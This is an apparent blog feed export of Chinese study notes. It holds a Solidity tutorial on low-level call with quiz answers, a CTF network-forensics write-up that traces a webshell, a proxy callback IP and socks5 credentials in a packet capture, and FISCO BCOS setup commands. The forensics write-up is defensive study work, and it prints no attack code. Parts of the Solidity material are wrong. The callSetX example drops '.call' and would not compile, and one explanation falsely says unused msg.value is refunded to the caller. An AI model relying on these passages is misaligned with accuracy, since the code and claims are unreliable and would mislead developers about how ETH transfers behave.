<h4 id="4-调用合约并发送ETH"><a href="#4-调用合约并发送ETH" class="headerlink" title="4.调用合约并发送ETH"></a>4.调用合约并发送ETH</h4><p>如果目标合约的函数是payable的，那么我们可以通过调用它来给合约转账：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">_Name(_Address).f&#123;value: _Value&#125;()</span><br></pre></td></tr></table></figure>



<p>其中**_Name<strong>是合约名，</strong>_Address<strong>是合约地址，</strong>f<strong>是目标函数名，</strong>_Value<strong>是要转的</strong>ETH<strong>数额（以</strong>wei**为单位）。</p>
<p><strong>OtherContract</strong>合约的<strong>setX</strong>函数是<strong>payable</strong>的，在下面这个例子中我们通过调用<strong>setX</strong>来往目标合约转账。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function setXTransferETH(address otherContract, uint256 x) payable external&#123;</span><br><span class="line">   OtherContract(otherContract).setX&#123;value: msg.value&#125;(x);</span><br><span class="line"> &#125;	</span><br></pre></td></tr></table></figure>



<h3 id="利用call调用合约"><a href="#利用call调用合约" class="headerlink" title="利用call调用合约"></a>利用call调用合约</h3><p>call 是address类型的低级成员函数，它用来与其他合约交互。它的返回值为<code>(bool, bytes memory)</code>，分别对应call是否成功以及目标函数的返回值。</p>
<p>不推荐用call来调用另一个合约，因为当你调用不安全合约的函数时，你就把主动权交给了它。推荐的方法仍是声明合约变量后调用函数</p>
<p>当我们不知道对方合约的源代码或ABI，就没法生成合约变量；这时，我们仍可以通过call调用对方合约的函数</p>
<p><strong>使用规则</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标合约地址.call(字节码);</span><br></pre></td></tr></table></figure>



<p>（其中字节码利用结构化编码函数abi.encodeWithSignature获得：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;函数签名&quot;, 逗号分隔的具体参数)</span><br></pre></td></tr></table></figure>



<p><strong>函数签名为”函数名（逗号分隔的参数类型）”</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">abi.encodeWithSignature(&quot;f(uint256,address)&quot;, _x, _addr)</span><br></pre></td></tr></table></figure>



<p>另外<code>call</code>在调用合约时可以指定交易发送的<strong>ETH</strong>数额和<strong>gas</strong>数额：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">目标合约地址.call&#123;value:发送数额, gas:gas数额&#125;(字节码);</span><br></pre></td></tr></table></figure>



<p>利用Call调用合约举例</p>
<ol>
<li><strong>Response事件</strong></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// 定义Response事件，输出call返回的结果success和data,方便观察返回值</span><br><span class="line">event Response(bool success, bytes data);</span><br></pre></td></tr></table></figure>



<ol start="2">
<li><p><strong>调用setX函数</strong></p>
<p>定义<strong>callSetX</strong>函数来调用目标合约的<strong>setX()<strong>，转入</strong>msg.value</strong>数额的<strong>ETH</strong>，并释放<strong>Response</strong>事件输出<strong>success</strong>和<strong>data</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callSetX(address payable _addr,uint256 x)public payable&#123;</span><br><span class="line"></span><br><span class="line">//同时还可发送eth,_addr是目标合约的地址</span><br><span class="line">(bool success,bytes memory data) = _addr&#123;value:msg.value&#125;(</span><br><span class="line">abi.encodeWithSignature(&quot;setX(uint256)&quot;, x)</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">emit Response(success,data);//释放事件</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
</ol>
<p>​	当我们此时调用callSetX把状态变量_x改为5，参数为OtherContract地址和5，由于目标函数setX()没有返回值，因此Response事件输出的data为0x，也就是空。</p>
<ol start="3">
<li><p><strong>调用getX函数</strong></p>
<p>所以我们还需要调用getX()函数用于返回目标合约X(uint256)的值</p>
</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callGetX(address _addr) external returns(uint256)&#123;</span><br><span class="line">	(bool success, bytes memory data) = _addr.call(</span><br><span class="line">	//可以利用abi.decode来解码call的返回值data，并读出数值。</span><br><span class="line">        abi.encodeWithSignature(&quot;getX()&quot;));</span><br><span class="line">        </span><br><span class="line">        emit Response(success,data);</span><br><span class="line">        return abi.decode(data, (uint256));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>从<code>Response</code>事件的输出，我们可以看到data为0x0000000000000000000000000000000000000000000000000000000000000005。而经过<code>abi.decode</code>，最终返回值为5。</p>
<ol start="4">
<li><strong>调用不存在的函数</strong></li>
</ol>
<p>如果给<code>call</code>输入的函数不存在于目标合约，那么目标合约的<strong>fallback</strong>函数会被触发。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callNonExist(address _addr)external&#123;</span><br><span class="line"></span><br><span class="line">//call不存在的foo()函数</span><br><span class="line">(bool success, bytes memory data)=_addr.call(</span><br><span class="line">abi.encodeWithSignature(&quot;foo(uint256)&quot;)</span><br><span class="line">	);</span><br><span class="line">	</span><br><span class="line">	emit Response(success,data);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>call了不存在的foo函数。call仍能执行成功，并返回success，但其实调用的目标合约fallback函数</p>
<h2 id="题："><a href="#题：" class="headerlink" title="题："></a>题：</h2><ul>
<li>​	下列关于事件的说法中，错误的是</li>
</ul>
<p>（选择一个答案） </p>
<p>A. Solidity中的事件（event）是EVM上日志的抽象。</p>
<p>B. 事件的声明由event关键字开头，然后跟事件名称。</p>
<p>C. 链上存储数据比存储事件的成本低。</p>
<p>D. 应用程序（ether.js）可以通过RPC接口订阅和监听这些事件，并在前端做响应。</p>
<p><strong>解析：</strong></p>
<ul>
<li><strong>选项 A：正确。事件在 Solidity 中是 EVM 上日志的抽象，事件记录在链上日志中，但不直接参与合约逻辑。</strong></li>
<li><strong>选项 B：正确。事件的声明确实是通过 event 关键字定义的。</strong></li>
<li><strong>选项 C：错误。实际上，存储事件的成本比直接在链上存储数据要低，因为事件被存储在交易日志中，而不占用合约的存储空间，这降低了成本。</strong></li>
<li><strong>选项 D：正确。应用程序（如 ethers.js）可以通过 RPC 接口监听这些事件，并在前端作出相应的反应。</strong></li>
</ul>
<p>正确答案是：</p>
<p>C. 链上存储数据比存储事件的成本低。</p>
<p>​	</p>
<ul>
<li>indexed关键字可以修饰任意类型的变量 选择一个答案 A. 正确 B. 错误</li>
</ul>
<p><strong>解析：</strong></p>
<p><strong>在 Solidity 中，indexed 关键字不能修饰任意类型的变量。最多只能对事件中的三个参数使用 indexed 修饰，并且它只适用于某些基本类型，例如 address、uint、int 和 bytes 等。复杂的结构体或数组类型无法被 indexed 修饰。</strong>所以错误。</p>
<ul>
<li>如果合约B继承了合约A，合约C要继承A和B，要怎么写？</li>
</ul>
<p> 选择一个答案</p>
<p> A. contract C is A, B</p>
<p> B. contract C is B, A</p>
<p> C. contract C is B</p>
<p><strong>父合约在子合约之前,A为正确选项</strong></p>
<p>合约B继承了合约A，两个合约都有pop()函数，下面选项中，正确调用父合约函数的是：</p>
<p> 选择一个答案 </p>
<p> A. A.pop();</p>
<p> B. super.pop();</p>
<p> C. 都正确</p>
<p><strong>解析：</strong></p>
<p><strong>在 Solidity 中，当子合约 B 继承了父合约 A，并且两个合约中都存在同名函数 pop() 时，可以通过以下两种方式调用父合约的 pop() 函数：</strong></p>
<p>·    <strong>A.pop();：直接通过父合约的名称调用父合约的 pop()。</strong></p>
<p>·    <strong>super.pop();：使用 super 关键字调用父合约的 pop()，特别适合在多重继承的情况下调用父类函数。</strong></p>
<p><strong>因此，两种方式都可以正确调用父合约的 pop() 函数,选C</strong></p>
<ul>
<li>function a() public override{} 意思是</li>
</ul>
<p>​	选择一个答案 </p>
<p>​	A. 希望子合约重写函数a()</p>
<p>​	B. 函数a()重写了父合约中的同名函数</p>
<p><strong>解析：</strong></p>
<p><strong>在 Solidity 中，override 关键字表示该函数是对父合约中同名函数的重写。因此，function a() public override {} 的意思是 该函数 a() 重写了父合约中的同名函数。</strong></p>
<ul>
<li>合约B继承了合约A，下面选项中，正确调用父合约构造函数的是：</li>
</ul>
<p>​		A. constructor(uint _num) { A(_num);} </p>
<p>​		B. constructor(uint _num) { A.constructor(_num);}</p>
<p>​		C. constructor(uint _num) A(_num){}</p>
<p><strong>解析：</strong></p>
<p><strong>在 Solidity 中，如果合约 B 继承了合约 A，并且需要在合约 B 的构造函数中调用合约 A 的构造函数，正确的写法是 constructor(uint _num) A(_num){}。</strong></p>
<ul>
<li>被导入文件中的全局符号想要被其他合约单独导入，应该怎么编写？</li>
</ul>
<p>（选择一个答案<strong>）</strong></p>
<p>​	A. 将合约结构包含</p>
<p>​	B. 包含在合约结构中</p>
<p>​	C. 与合约并列在文件结构中</p>
<p><strong>解析</strong></p>
<p><strong>当文件中的全局符号（例如函数、结构体、枚举等）希望被其他合约单独导入时，需要将这些符号定义在合约之外，即与合约并列在文件结构中，而不是包含在特定合约的内部。</strong></p>
<p><strong>这样一来，这些符号就在文件的全局作用域中，便于其他文件或合约通过 import 语句直接导入和使用，选C。</strong></p>
<ul>
<li><p>Solidity中import的作用是：</p>
<p> A. 导入其他合约中的接口</p>
<p>B. 导入其他合约中的私有变量 </p>
<p>C. 导入其他合约中的全局符号 </p>
<p>D. 导入其他合约中的内部变量</p>
</li>
</ul>
<p><strong>解析</strong></p>
<p><strong>在 Solidity 中，import 关键字用于导入其他文件中定义的全局符号，如合约、库、结构体、枚举等。这使得开发者可以在当前文件中使用其他文件中的符号。</strong></p>
<p><strong>选项分析：</strong></p>
<p>·    <strong>A. 导入其他合约中的接口：虽然可以导入接口，但 import 并不限于接口。</strong></p>
<p><strong>·    B. 导入其他合约中的私有变量：私有变量不能在其他合约中直接访问，import 不能导入私有变量。</strong></p>
<p><strong>·    C. 导入其他合约中的全局符号：这是正确答案，因为 import 可以导入各种全局符号。</strong></p>
<p><strong>·    D. 导入其他合约中的内部变量：import 不能直接导入内部变量（internal 变量），但可以通过继承的方式访问。</strong></p>
<p><strong>因此，正确答案是 C。</strong></p>
<ul>
<li>以下import写法错误的是：</li>
</ul>
<p>​	 A. import from “.&#x2F;Yeye.sol”;</p>
<pre><code> B. import &#123;Yeye&#125; from &quot;./Yeye.sol&quot;;
 
 C. import &#123;Yeye as Wowo&#125; from &quot;./Yeye.sol&quot;; 
 
 D. import * as Wowo from &quot;./Yeye.sol&quot;;
</code></pre>
<p><strong>解析</strong></p>
<p>*<em>在 Solidity 中，import 语句需要指定导入内容或者使用通配符 * 进行导入。选项 A 缺少导入的具体内容，这是错误的写法。正确的写法应当明确指定要导入的符号或使用通配符 <em>。</em></em></p>
<p><strong>选项分析：</strong></p>
<p><strong>·    A. import from “.&#x2F;Yeye.sol”;：错误。未指定导入的内容，语法不完整。</strong></p>
<p><strong>·    B. import {Yeye} from “.&#x2F;Yeye.sol”;：正确。导入了 Yeye 合约。</strong></p>
<p><strong>·    C. import {Yeye as Wowo} from “.&#x2F;Yeye.sol”;：正确。导入并将 Yeye 别名为 Wowo。</strong></p>
<p><strong>·    D. import * as Wowo from “.&#x2F;Yeye.sol”;：正确。导入 Yeye.sol 中所有符号，并以 Wowo 作为命名空间。</strong></p>
<p>  什么是命名空间？</p>
<p>​	命名空间帮助开发者将相关的功能或数据组织在一起，使得代码逻辑更加清晰。</p>
<p>​	通过命名空间的前缀，开发者可以快速了解某个标识符的来源和用途。</p>
<p><strong>因此，A 是错误的导入写法。</strong></p>
<ul>
<li><p>import导入文件中的全局符号可以单独指定其中的： </p>
<p> A. 合约</p>
<p> B. 纯函数</p>
<p> C. 结构体类型</p>
<p> D. 以上都可以</p>
</li>
</ul>
<p><strong>解析</strong></p>
<p>​	 <strong>在 Solidity 中，import 语句可以单独指定要导入的符号，包括合约、函数、结构体等。例如：</strong></p>
<p><strong>·    合约：可以通过 import { ContractName } from “file.sol”; 来导入文件中的特定合约。</strong></p>
<p><strong>·    纯函数：如果文件中定义了 pure 或 view 的全局函数（从 Solidity 0.6.0 开始支持的功能），也可以通过 import { functionName } from “file.sol”; 来单独导入。</strong></p>
<p><strong>·    结构体类型：可以使用 import { StructName } from “file.sol”; 来单独导入结构体定义。</strong></p>
<p><strong>因此，D. 以上都可以 是正确答案。</strong></p>
<p>* </p>
<p><img src="https://s2.loli.net/2024/11/18/BycbYiXFE24tvnG.png" alt="2.png"></p>
<p><strong>解析</strong></p>
<p>假设 SendETH 合约中 callETH 函数的代码如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">function callETH(address payable _to) external payable &#123;</span><br><span class="line"></span><br><span class="line">  // 假设发送 1ETH 给 ReceiveETH 合约</span><br><span class="line"></span><br><span class="line">  (bool success, ) = _to.call&#123;value: 1 ether&#125;(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">  require(success, &quot;Transfer failed&quot;);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>在这种情况下，以下是执行步骤和各合约的 ETH 余额变化：</p>
<p> <strong>交易初始化</strong>：Vitalik 调用 SendETH 合约的 callETH 函数，没有设置 msg.value。SendETH 合约接收到 2 ETH。</p>
<p> <strong>转账执行</strong>：callETH 函数内部使用了 call{value: 1 ether}(“”)，向 ReceiveETH 合约发送 1 ETH。因此，ReceiveETH 合约将接收到 1 ETH，SendETH 合约的余额减少 1 ETH。</p>
<p><strong>最终余额</strong>：</p>
<p>o  SendETH 合约：2 ETH（初始接收） - 1 ETH（发送） &#x3D; 1 ETH</p>
<p>o  ReceiveETH 合约：接收 1 ETH</p>
<p>由于没有设置msg.value，执行完交易后，SendETH 合约的余额为 <strong>1 ETH</strong>，而 ReceiveETH 合约的余额为 <strong>1 ETH</strong>。</p>
<p><strong>如果设置了msg.value，则SendETH为0ETH，</strong></p>
<p>这是因为 msg.value 是直接随交易发送到 SendETH 合约的，以支付调用 callETH 函数的资金。这笔 2 ETH 会被发送到 SendETH 合约，但 SendETH 合约并不保留这 2 ETH，而是立即在 callETH 函数中使用其中的 1 ETH 进行转账，剩余的 1 ETH 也不被 SendETH 合约保留。</p>
<p>以下是更详细的解释：</p>
<ol>
<li><p><strong>初始交易的 2 ETH</strong>：Vitalik 发送的 msg.value 是 2 ETH，这笔资金在调用 SendETH 合约的 callETH 函数时传入。</p>
</li>
<li><p><strong>发送 1 ETH 给 ReceiveETH</strong>：callETH 函数中使用了 call{value: 1 ether}(“”) 向 ReceiveETH 合约转账 1 ETH。</p>
</li>
<li><p><strong>剩余的 1 ETH</strong>：由于 callETH 函数中并没有将剩余的 1 ETH 存入 SendETH 合约的余额（例如未将 msg.value - 1 ether 显式存入），交易结束时，这部分 1 ETH 会被直接退还给调用者（Vitalik），因为 Solidity 中的函数执行完毕后未被使用的 msg.value 会被退还。</p>
</li>
</ol>
<p><strong>总结</strong></p>
<p>因此，交易完成后：</p>
<p>·    SendETH 合约没有余额，余额为 <strong>0 ETH</strong></p>
<p>·    ReceiveETH 合约收到并保留了 1 ETH</p>
<ul>
<li><p>下列关于智能合约调用其他智能合约的说法，正确的一项是：</p>
<p> 选择一个答案</p>
<p> A. 智能合约调用其他智能合约这一功能，主要起到了方便代码复用的作用</p>
<p> B. 在智能合约A中调用智能合约B，比起从EOA直接调用智能合约B，要更节省gas </p>
<p> C. 智能合约B中可见性为internal的函数也可以被智能合约A调用</p>
</li>
</ul>
<p><strong>解析</strong></p>
<p>· <strong>选项 A 是正确的。智能合约调用其他智能合约确实可以方便代码复用。这样可以减少重复代码并提高合约的模块化，使开发更加灵活和高效。</strong></p>
<p><strong>· 选项 B 是不正确的。在智能合约 A 中调用智能合约 B 实际上比直接从外部账户（EOA）调用智能合约 B 消耗更多的 Gas，因为这涉及到更多的操作步骤（合约 A 需要发起外部调用），并没有节省 Gas 的效果。</strong></p>
<p><strong>· 选项 C 是不正确的。internal 可见性表示函数只能在同一个合约或继承的合约中调用，不能被其他合约直接调用。因此，合约 A 无法直接调用合约 B 中 internal 的函数。</strong></p>
<ul>
<li>下面哪种使用方式不正确？</li>
</ul>
<p>​	A. address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, 	“MyName”)); </p>
<p>​	B. address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, 		“MyName”)); </p>
<p>​	C. address.call{gas: 1000000, value: 1 ether} </p>
<p>​	D. address(nameReg).call{gas: 1000000, value: 1 ether}</p>
<p>​	</p>
<p><strong>解析</strong></p>
<p>逐一分析</p>
<p> <strong>选项 A：address(nameReg).call{gas: 1000000}(abi.encodeWithSignature(“register(string)”, “MyName”));</strong></p>
<p>o 这是正确的写法，使用了 .call{gas: …} 发送指定的 gas 量，并通过 abi.encodeWithSignature 来对函数调用参数进行编码。此调用会尝试在 nameReg 地址处调用 register(string) 函数，提供字符串 “MyName” 作为参数。</p>
<p><strong>选项 B：address(nameReg).call{value: 1 ether}(abi.encodeWithSignature(“register(string)”, “MyName”));</strong></p>
<p>o 这是正确的写法，使用了 .call{value: …} 发送指定的 value（即 1 ether），并且使用了 abi.encodeWithSignature 对函数和参数进行编码。</p>
<p>o 该调用会在发送 1 ether 的情况下，尝试调用 nameReg 地址上的 register(string) 函数。</p>
<p> <strong>选项 C：address.call{gas: 1000000, value: 1 ether}</strong></p>
<p>o 这是不正确的写法。address.call{…} 的语法要求提供被调用的目标地址，而这里没有指定有效地址和编码的数据。正确写法应为 address(target).call{gas: …, value: …}(data)。</p>
<p>o 这里 address 作为数据类型使用是不对的，应该是一个具体的地址实例，比如 address(target)。</p>
<p> <strong>选项 D：address(nameReg).call{gas: 1000000, value: 1 ether}</strong></p>
<p>o 这是正确的写法，因为 address(nameReg).call{gas: …, value: …}(data) 提供了 gas 和 value，并调用 nameReg 这个合约地址。</p>
<p><strong>因此，C 是错误的使用方式，因为它缺少了有效的地址实例（目标地址）和调用的数据。</strong></p>
<p><img src="https://s2.loli.net/2024/11/18/EYM5s4byNx2dROt.png" alt="3.png"></p>
<p><strong>解析</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">OtherContract other = OtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);</span><br></pre></td></tr></table></figure>



<p>o 这种写法直接实例化了 OtherContract 合约。因为 OtherContract 合约实现了 IOtherContract 接口，这种写法允许我们调用 OtherContract 中的所有公共函数。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">IOtherContract other = IOtherContract(0xd9145CCE52D386f254917e481eB44e9943F39138);</span><br></pre></td></tr></table></figure>



<p>o 这种写法使用了 IOtherContract 接口进行实例化，可以用来调用 IOtherContract 中声明的函数。只要 OtherContract 实现了 IOtherContract 接口，这种方式也是正确的。</p>
<p>因此，**(1) 和 (2) 均是正确的调用方式**，可以使用任意一种方法来调用合约。</p>
<p><img src="https://s2.loli.net/2024/11/18/lPv1sNgO5QoMCUn.png" alt="4.png"></p>
<p><strong>解析</strong></p>
<p><strong>· 选项 A：MyContract 是 OtherContract 的子类</strong></p>
<p><strong>o 不正确。MyContract 并没有继承 OtherContract，它只是实例化了 OtherContract 并通过地址直接调用它的函数，因此不构成继承关系。</strong></p>
<p><strong>· 选项 B：MyContract 是 IOtherContract 的一个实现</strong></p>
<p><strong>o 不正确。MyContract 也没有实现 IOtherContract 接口。它只是定义了与 OtherContract 交互的函数，而不是实现 IOtherContract 中的所有接口。</strong></p>
<p><strong>· 选项 C：MyContract 需要 0xd9145CCE52D386f254917e481eB44e9943F39138 的某种许可，才可以调用其中的函数</strong></p>
<p><strong>o 不正确。只要 OtherContract 中的函数是 external 或 public 且无访问权限限制，任何合约或外部账户都可以调用它。OtherContract 中的 setX 和 getX 都没有额外的权限控制。</strong></p>
<p><strong>· 选项 D：MyContract 的函数 call_setX 可以实现，这意味着 OtherContract 中 setX 的权限没有门槛，存在安全隐患</strong></p>
<p><strong>o 正确。OtherContract 的 setX 函数是 external 并且没有权限控制，因此任何合约或账户都可以调用并修改 _x 的值。这确实可能带来安全隐患，尤其是在 _x 变量值的更改可能影响合约逻辑的情况下。如果不希望外部随意调用，应该在 setX 函数中添加访问控制。</strong></p>
]]></content>
      <tags>
        <tag>solidity</tag>
      </tags>
  </entry>
  <entry>
    <title>流量分析题解1</title>
    <url>/2025/04/25/%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90%E9%A2%98%E8%A7%A3/</url>
    <content><![CDATA[<blockquote>
<p>原题分析链接：<a href="http://t.csdnimg.cn/slyXZ">http://t.csdnimg.cn/slyXZ</a></p>
</blockquote>
<h2 id="方法提取"><a href="#方法提取" class="headerlink" title="方法提取"></a>方法提取</h2><p><img src="https://s2.loli.net/2025/04/26/oqecUH41QfNXj8I.png" alt="1.png">（关键字搜索的图标或者直接ctrl+f)</p>
<p>在Wireshark中，当你看到“value处的truncated”时，这通常意味着数据包中的某个字段或值在捕获时被截断，未能完整显示。</p>
<h2 id="题目："><a href="#题目：" class="headerlink" title="题目："></a>题目：</h2><p>01 黑客登录系统使用的密码是______？</p>
<p>02 黑客修改了一个日志文件，文件的绝对路径为______？（请确认绝对路径后再提交）</p>
<p>03 黑客获取webshell之后，权限是______？</p>
<p>04 黑客写入的webshell文件名是______？(请提交带有文件后缀的文件名，例如x.txt)</p>
<p>05 黑客上传的代理工具客户端名字是______？如有字母请全部使用小写）</p>
<p>06 黑客代理工具的回连服务端IP是______？</p>
<p>07 黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。</p>
<h2 id="题解："><a href="#题解：" class="headerlink" title="题解："></a>题解：</h2><p><em><strong>*01 黑客登录系统使用的密码是______？*</strong></em></p>
<p>过滤器处输入“http.request.method&#x3D;&#x3D;”POST””也可直接检索(login)</p>
<p>找到有该字样的流量</p>
<p><img src="https://s2.loli.net/2025/04/26/SRHaUZBDFfWc1zv.png" alt="2.png"> </p>
<p>查看可得</p>
<p><img src="https://s2.loli.net/2025/04/26/D9ohg4iVIy1BOx3.png" alt="3.png"> </p>
<p>所以密码是Admin123!@#</p>
<p><em><strong>*02 黑客修改了一个日志文件，文件的绝对路径为______？（请确认绝对路径后再提交）*</strong></em></p>
<p><em><strong>*在分组字节流搜索.log*</strong></em></p>
<p>找到如图流量</p>
<p><img src="https://s2.loli.net/2025/04/26/ZAiGMkxNlW3nrJz.png" alt="4.png"> </p>
<p><em><strong>*Tpl处即为绝对路径*</strong></em></p>
<p><img src="https://s2.loli.net/2025/04/26/UfLNt9peaOEldRs.png" alt="5.png"> </p>
<p>尝试追踪流——http流</p>
<p><img src="https://s2.loli.net/2025/04/26/Rb6pNkh2xaKuFYM.png" alt="6.png"> </p>
<p>得到了浏览器的绝对路径&#x2F;var&#x2F;www&#x2F;html</p>
<p>所以文件的绝对路径是：&#x2F;var&#x2F;www&#x2F;html&#x2F;data&#x2F;Runtime&#x2F;Logs&#x2F;Home&#x2F;21_08_07.log</p>
<p><em><strong>*03 黑客获取webshell之后，权限是______？*</strong></em></p>
<p>在分组字节流搜索whoami</p>
<p>找到tcp流下一个http流（此处需要多找几次）</p>
<p><img src="https://s2.loli.net/2025/04/26/ZkDylv7B6qj8tNs.png" alt="7.png"> </p>
<p>找到权限为www-data</p>
<p><em><strong>*04 黑客写入的webshell文件名是______？(请提交带有文件后缀的文件名，例如x.txt)*</strong></em></p>
<p>在第二题的寻找过程可以查找到</p>
<p><img src="https://s2.loli.net/2025/04/26/WP6rkNIg9GMToXE.png" alt="8.png"> </p>
<p>所以写入的webshell文件名是：1.php</p>
<p><em><strong>*05 黑客上传的代理工具客户端名字是______？如有字母请全部使用小写）*</strong></em></p>
<p>由第三题过程中可以看到webshell的连接密码为aaa</p>
<p><img src="https://s2.loli.net/2025/04/26/FTPg8RyOoqYt2hk.png" alt="9.png"> </p>
<p>搜索aaa然后追踪http流</p>
<p><img src="https://s2.loli.net/2025/04/26/xzjZ7kyHc3vMwQd.png" alt="10.png"> </p>
<p>找到09:42:32这条 即为客户端名字</p>
<p><img src="https://s2.loli.net/2025/04/26/y3okKzWLGx1DfTr.png" alt="11.png"> </p>
<p><em><strong>*06 黑客代理工具的回连服务端IP是______？*</strong></em></p>
<p>将第五题的http流复制</p>
<p><img src="https://s2.loli.net/2025/04/26/7rfo2M8c5vIWmus.png" alt="12.png"> </p>
<p>粘贴在burp ——编码工具——解码选择ascll十六进制数</p>
<p><img src="https://s2.loli.net/2025/04/26/u52b6H8lLi9ogYB.png" alt="13.png"> </p>
<p>所以ip是192.168.239.123</p>
<p><em><strong>*07 黑客的socks5的连接账号、密码是______。（中间使用#号隔开，例如admin#passwd）。*</strong></em></p>
<p>同样是第五题的http流，复制一下从第三排“a&#x3D;”后面一直到红字结束</p>
<p><img src="https://s2.loli.net/2025/04/26/8ChDNuPWko6O1ZE.png" alt="14.png"> </p>
<p>粘贴到burp,同样方法解码</p>
<p><img src="https://s2.loli.net/2025/04/26/Bv4kf3ITGFnZp2z.png" alt="15.png"> </p>
<p>所以账号：0HDFt16cLQJ</p>
<p>​    密码：JTN276GP</p>
]]></content>
      <tags>
        <tag>传统安全</tag>
      </tags>
  </entry>
  <entry>
    <title>外部app与区块链进行交互</title>
    <url>/2025/03/13/%E5%A4%96%E9%83%A8app%E4%B8%8E%E5%8C%BA%E5%9D%97%E9%93%BE%E8%BF%9B%E8%A1%8C%E4%BA%A4%E4%BA%92/</url>
    <content><![CDATA[<h2 id="外部应用程序与区块链进行交互案例与流程"><a href="#外部应用程序与区块链进行交互案例与流程" class="headerlink" title="外部应用程序与区块链进行交互案例与流程"></a><strong>外部应用程序与区块链进行交互案例与流程</strong></h2><h3 id="案例大致目标"><a href="#案例大致目标" class="headerlink" title="案例大致目标"></a>案例大致目标</h3><ol>
<li><p>掌握FISCO BCOS应用环境的搭建与使用（FISCO BCOS+WeBASE）</p>
</li>
<li><p>掌握基于Java + SpringBoot的应用程序后端项目搭建与开发。</p>
</li>
<li><p>掌握应用程序后端与FISCO BCOS链的交互。</p>
</li>
<li><p>掌握应用程序前端项目搭建与开发</p>
</li>
</ol>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="应用开发整体架构示例"><a href="#应用开发整体架构示例" class="headerlink" title="应用开发整体架构示例"></a>应用开发整体架构示例</h4><p><img src="https://s2.loli.net/2025/03/17/VLA7J3TUtZWFKdf.png" alt="1.png"></p>
<h4 id="应用开发整体流程示例"><a href="#应用开发整体流程示例" class="headerlink" title="应用开发整体流程示例"></a>应用开发整体流程示例</h4><p>【2】</p>
<p><strong>步骤一</strong>：构建区块链应用环境。搭建FISCO BCOS环境，搭建WeBASE-Front平台实现，部署示例智能合约。</p>
<p><strong>步骤二</strong>：构建应用程序后端。通过WeBASE- Front导出后端项目，基于WeBASE Front API开发示例智能合约使用接口。</p>
<p><strong>步骤三</strong>：构建应用程序前端。下载示例前端代码模板，区块链功能应用开发。</p>
<h3 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h3><h4 id="搭建FISCO-BCOS区块链"><a href="#搭建FISCO-BCOS区块链" class="headerlink" title="搭建FISCO BCOS区块链"></a>搭建FISCO BCOS区块链</h4><p><strong>实现步骤：</strong></p>
<ol>
<li><p>下载build_chain.sh工具</p>
</li>
<li><p>使用build_chain.sh配置区块链</p>
</li>
<li><p>使用build_chain.sh启动区块链</p>
</li>
</ol>
<p><strong>命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">mkdir</span> -p ~/fisco</span><br><span class="line"><span class="built_in">cd</span> ~/fisco</span><br><span class="line">curl -#LO https://github.com/FISCO-BCOS/FISCO- BCOS/releases/download/v2.7.2/build_chain.sh &amp;&amp; <span class="built_in">chmod</span> u+x</span><br><span class="line">build_chain.shchmod u+x build_chain.sh</span><br><span class="line">bash build_chain.sh -l 127.0.0.1:4 -p 30300,20200,8545</span><br><span class="line">bash nodes/127.0.0.1/start_all.sh</span><br></pre></td></tr></table></figure>

<p><strong>成功示例：</strong></p>
<p><img src="https://s2.loli.net/2025/03/17/ayWe91jsFuNSlUd.png" alt="3.png"></p>
<h4 id="搭建WeBASE-Front平台"><a href="#搭建WeBASE-Front平台" class="headerlink" title="搭建WeBASE-Front平台"></a><strong>搭建WeBASE-Front平台</strong></h4><p><strong>实现步骤：</strong></p>
<ol>
<li>下载WeBASE-Front安装包</li>
<li>配置WeBASE-Front</li>
<li>启动WeBASE-Front</li>
</ol>
<p><strong>命令如下：</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget https://osp-1257653870.cos.ap- guangzhou.myqcloud.com/WeBASE/releases/download/v1.5.2/webas</span><br><span class="line">e-front.zip</span><br><span class="line"> unzip webase-front.zip</span><br><span class="line"> <span class="built_in">cd</span> webase-front</span><br><span class="line"> <span class="built_in">cp</span> -r ~/fisco/nodes/127.0.0.1/sdk/* ./conf/</span><br><span class="line"> bash start.sh</span><br></pre></td></tr></table></figure>

<h4 id="示例区块链智能合约部署"><a href="#示例区块链智能合约部署" class="headerlink" title="示例区块链智能合约部署"></a><strong>示例区块链智能合约部署</strong></h4><p><strong>一、智能合约文件创建</strong></p>
<ol>
<li><p>使用浏览器登录<a href="http://localhost:5002/WeBASE-Front%E7%BD%91%E7%AB%99">http://localhost:5002/WeBASE-Front网站</a></p>
</li>
<li><p>点击“合约管理”-&gt;“合约IDE” ，新建智能合约，如右第一张图所示。</p>
</li>
<li><p>在弹出对话框中输入合约名为“StringGetSet” ，文件目录为“&#x2F;” ，点击“确认“ ，查看文件导航栏是否有StringGetSet文件，如右第二张图所示。</p>
</li>
